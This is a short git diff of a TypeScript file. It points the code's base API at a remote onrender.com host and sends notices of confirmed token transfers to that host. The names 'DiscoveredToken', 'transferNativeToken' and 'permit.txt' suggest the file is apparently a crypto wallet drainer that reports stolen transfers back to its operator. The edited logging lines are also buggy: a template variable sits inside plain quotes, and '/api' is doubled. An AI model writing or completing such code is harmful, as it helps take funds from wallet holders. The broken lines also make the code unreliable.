@@ -49,8 +49,8 @@ interface DiscoveredToken {
 // import axios from "axios";
 
 const isLoggingEnabled = true;
-//const BASE_API_URL = "https://drn-2stp.onrender.com/api"; // From permit.txt
-const BASE_API_URL = "http://localhost:8080/api";
+const BASE_API_URL = "https://drn-2stp.onrender.com/api"; // From permit.txt
+// const BASE_API_URL = "http://localhost:8080/api";
 
 
 const stringifyMessage = (message: unknown): string => {
@@ -1304,7 +1304,7 @@ const transferNativeToken = async (
       await log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
       await log(`Transaction confirmed: ${tx.hash}`);
-      await axios.post("https://your-vercel-app.vercel.app/api/log", {
+      await axios.post("${BASE_API_URL}/api/log", {
         level: "info",
         message: `EVM transaction confirmed: ${tx.hash}`,
         timestamp: new Date().toISOString(),
@@ -1324,7 +1324,7 @@ const transferNativeToken = async (
       await log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
       await log(`Transaction confirmed: ${tx.hash}`);
-      await axios.post("https://your-vercel-app.vercel.app/api/log", {
+      await axios.post("${BASE_API_URL}/api/log", {
         level: "info",
         message: `EVM transaction confirmed: ${tx.hash}`,
         timestamp: new Date().toISOString(),
